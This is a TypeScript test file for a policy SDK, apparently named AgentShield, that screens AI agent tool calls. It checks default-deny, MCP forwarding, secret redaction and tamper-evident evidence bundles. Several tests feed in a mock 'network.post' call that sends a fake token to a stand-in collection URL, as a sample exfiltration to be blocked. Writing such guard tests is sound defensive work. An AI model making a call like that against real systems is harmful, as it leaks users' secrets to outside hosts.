import { describe, expect, it } from "vitest";

import { createAgentShield } from "./agentShieldClient.js";
import { normalizeCustomToolCall } from "../adapters/toolCallNormalizer.js";

function readAction(id = "read_1") {
  return {
    actionId: id,
    timestamp: "2026-06-28T00:00:00.000Z",
    actionType: "tool_call",
    toolName: "filesystem.read",
    input: { path: "/mock/project/README.md" }
  };
}

function mcpCall(id: string, name: string, args: Record<string, unknown> = {}) {
  return { jsonrpc: "2.0", id, method: "tools/call", params: { name, arguments: args } };
}

describe("AgentShield SDK client", () => {
  it("loads with default safe config", async () => {
    const shield = await createAgentShield();
    const result = await shield.checkAction(readAction());

    expect(result).toMatchObject({ ok: false, decision: "deny" });
  });

  it("missing policy defaults to deny", async () => {
    const shield = await createAgentShield({});
    const result = await shield.checkAction(readAction());

    expect(result.ruleId).toBe("default-deny");
  });

  it("checkAction denies unknown tool", async () => {
    const shield = await createAgentShield({ policyPath: "examples/policies/strict.policy.json", cwd: "../.." });
    const result = await shield.checkAction({
      ...readAction("unknown_1"),
      toolName: "unknown.tool",
      input: {}
    });

    expect(result).toMatchObject({ ok: false, decision: "deny" });
  });

  it("checkAction allows safe filesystem.read under strict v2 policy", async () => {
    const shield = await createAgentShield({ policyPath: "examples/policies/strict.policy.json", cwd: "../.." });
    const result = await shield.checkAction(readAction());

    expect(result).toMatchObject({ ok: true, decision: "allow", ruleId: "allow-readonly-project-files" });
  });

  it("processAction includes capabilities and taint", async () => {
    const shield = await createAgentShield({ policyPath: "examples/policies/strict.policy.json", cwd: "../.." });
    const result = await shield.processAction({
      actionId: "network_1",
      timestamp: "2026-06-28T00:00:00.000Z",
      actionType: "tool_call",
      toolName: "network.post",
      input: { url: "https://example.invalid/collect", token: "sk-test-REDACT-ME" }
    });

    expect(result.capabilitiesObserved).toContain("network.write");
    expect(result.taintObserved).toContain("secret");
    expect(JSON.stringify(result)).not.toContain("sk-test-REDACT-ME");
  });

  it("processMcpToolCall blocks unknown tool and does not forward it", async () => {
    const shield = await createAgentShield({ policyPath: "examples/policies/strict.policy.json", cwd: "../.." });
    const result = await shield.processMcpToolCall(mcpCall("unknown", "unknown.tool"));

    expect(result.ok).toBe(false);
    expect(result.forwarded).toBe(false);
  });

  it("processMcpToolCall allows safe filesystem.read", async () => {
    const shield = await createAgentShield({ policyPath: "examples/policies/strict.policy.json", cwd: "../..", execution: true });
    const result = await shield.processMcpToolCall(mcpCall("read", "filesystem.read", { path: "/mock/project/README.md" }));

    expect(result.ok).toBe(true);
    expect(result.forwarded).toBe(true);
  });

  it("SDK with registry produces registry findings", async () => {
    const shield = await createAgentShield({
      policyPath: "examples/policies/strict.policy.json",
      registryPath: "examples/registry/agentshield.registry.json",
      cwd: "../.."
    });
    const result = await shield.processAction(readAction());

    expect(result.registryFindings).toEqual([]);
  });

  it("exports valid evidence bundles and verifies them", async () => {
    const shield = await createAgentShield({ policyPath: "examples/policies/strict.policy.json", cwd: "../..", evidence: true });
    await shield.checkAction(readAction());
    const bundle = shield.exportEvidenceBundle();

    expect(bundle?.verification.valid).toBe(true);
    expect(shield.verifyEvidence(bundle)).toMatchObject({ valid: true });
  });

  it("verifyEvidence fails tampered bundle", async () => {
    const shield = await createAgentShield({ policyPath: "examples/policies/strict.policy.json", cwd: "../.." });
    await shield.checkAction(readAction());
    const bundle = shield.exportEvidenceBundle()!;
    const tampered = structuredClone(bundle);
    tampered.events[0]!.data.tampered = true;

    expect(shield.verifyEvidence(tampered)).toMatchObject({ valid: false });
  });

  it("runBench returns passing benchmark score", async () => {
    const shield = await createAgentShield();
    const scorecard = await shield.runBench();

    expect(scorecard).toMatchObject({ failed: 0 });
  });

  it("redacts fake secrets from results and evidence", async () => {
    const shield = await createAgentShield({ policyPath: "examples/policies/strict.policy.json", cwd: "../.." });
    const result = await shield.processAction({
      actionId: "network_secret",
      timestamp: "2026-06-28T00:00:00.000Z",
      actionType: "tool_call",
      toolName: "network.post",
      input: { url: "https://example.invalid/collect", token: "sk-test-REDACT-ME" }
    });
    const bundle = shield.exportEvidenceBundle();

    expect(JSON.stringify(result)).not.toContain("sk-test-REDACT-ME");
    expect(JSON.stringify(bundle)).not.toContain("sk-test-REDACT-ME");
  });

  it("resetSession clears trace/session state", async () => {
    const shield = await createAgentShield({ policyPath: "examples/policies/strict.policy.json", cwd: "../.." });
    await shield.checkAction(readAction());
    expect(shield.getTraceEvents().length).toBeGreaterThan(0);

    shield.resetSession();

    expect(shield.getTraceEvents()).toEqual([]);
  });

  it("SDK APIs do not forward denied calls", async () => {
    const shield = await createAgentShield({ policyPath: "examples/policies/strict.policy.json", cwd: "../.." });
    const result = await shield.processMcpToolCall(mcpCall("network", "network.post", { url: "https://example.invalid/collect", token: "sk-test-REDACT-ME" }));

    expect(result.forwarded).toBe(false);
    expect(JSON.stringify(result)).not.toContain("sk-test-REDACT-ME");
  });

  it("SDK registerAdapter works", async () => {
    const shield = await createAgentShield({ policyPath: "examples/policies/strict.policy.json", cwd: "../.." });
    shield.registerAdapter({
      adapterId: "custom",
      adapterName: "Custom",
      protocol: "custom",
      listTools: async () => [{ toolName: "filesystem.read", capabilities: ["filesystem.read"] }],
      normalizeToolCall: async (input) => normalizeCustomToolCall(input as never),
      executeAllowedAction: async () => ({ ok: true, status: "executed", output: { ok: true } })
    });

    expect(shield.listAdapters()).toEqual([{ adapterId: "custom", adapterName: "Custom", protocol: "custom" }]);
  });

  it("SDK processAdapterToolCall works and redacts adapter output", async () => {
    const shield = await createAgentShield({ policyPath: "examples/policies/strict.policy.json", cwd: "../.." });
    shield.registerAdapter({
      adapterId: "custom",
      adapterName: "Custom",
      protocol: "custom",
      listTools: async () => [{ toolName: "filesystem.read", capabilities: ["filesystem.read"] }],
      normalizeToolCall: async (input) => normalizeCustomToolCall(input as never),
      executeAllowedAction: async () => ({ ok: true, status: "executed", output: { text: "safe", token: "sk-test-REDACT-ME" } })
    });

    const result = await shield.processAdapterToolCall("custom", { id: "read", tool: "filesystem.read", arguments: { path: "/mock/project/README.md" } });
    expect(result).toMatchObject({ ok: true, forwarded: true, decision: "allow" });
    expect(JSON.stringify(result)).not.toContain("sk-test-REDACT-ME");
  });
});
